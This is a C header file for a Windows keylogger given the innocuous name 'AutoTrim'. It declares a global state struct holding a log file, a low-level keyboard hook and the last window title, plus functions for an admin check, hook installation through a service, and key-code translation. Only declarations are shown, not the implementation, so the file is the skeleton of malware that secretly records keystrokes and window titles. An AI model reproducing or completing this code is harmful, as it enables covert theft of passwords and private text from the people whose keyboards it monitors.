#pragma once

#pragma region "Includes"

	#include <windows.h>
    #include <string.h>
	#include <stdio.h>
	#include <errno.h>
	#include <time.h>
	#include <ShlObj.h>

#pragma endregion

#pragma region "Variables"

	#define NAME		"AutoTrim"
	#define VERSION		"1.0.0"

	// Structure for the global keylogger state
    typedef struct s_winkey_state 
	{
        FILE   *logFile;          // opened log file
        HHOOK   keyboardHook;     // installed hook handle
        HWND    lastWindow;       // last foreground window
        char    lastTitle[256];   // last logged window title
    }   t_WinkeyState;

	extern t_WinkeyState g_winkeyState;

#pragma endregion

#pragma region "Methods"

	// main.c
    BOOL IsAdmin(void);

    // service.c - Service management and activation/deactivation
    BOOL ActivateHook(void);
    void DeactivateHook(void);

    // hook.c - Hook callback used by service.c
    LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam);

    // key.c - Key codes to human-readable text conversion
    const char *VkCodeToString(DWORD vkCode);
    
    // keyboardstate.c
    void BuildKeyboardState(BYTE ks[256]);

#pragma endregion
